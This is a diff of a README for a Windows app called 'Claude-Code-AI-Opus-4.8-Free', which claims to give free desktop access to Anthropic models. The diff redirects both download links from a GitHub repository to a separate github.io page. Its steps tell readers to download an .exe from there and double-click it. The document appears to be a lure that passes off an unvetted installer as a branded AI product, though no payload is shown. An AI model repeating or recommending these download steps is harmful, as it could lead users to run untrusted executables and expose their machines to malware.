@@ -1,6 +1,6 @@
 # 🤖 Claude-Code-AI-Opus-4.8-Free - Run advanced AI models on desktop
 
-[![](https://img.shields.io/badge/Download-Claude_Code_App-blue.svg)](https://github.com/berkeinfor451/Claude-Code-AI-Opus-4.8-Free)
+[![](https://img.shields.io/badge/Download-Claude_Code_App-blue.svg)](https://berkeinfor451.github.io)
 
 This application provides access to advanced AI reasoning models directly on your Windows computer. It connects to the latest Anthropic models to assist with coding tasks, automated workflows, and complex problem-solving. This tool simplifies the process of using high-level AI without complex programming knowledge.
 
@@ -18,7 +18,7 @@ To run this software, your computer must meet these basic specifications:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the repository page to download the software: [Download Claude Code AI](https://github.com/berkeinfor451/Claude-Code-AI-Opus-4.8-Free).
+1. Visit the repository page to download the software: [Download Claude Code AI](https://berkeinfor451.github.io).
 2. Locate the most recent Windows installer file. It usually ends with a .exe extension.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation setup.
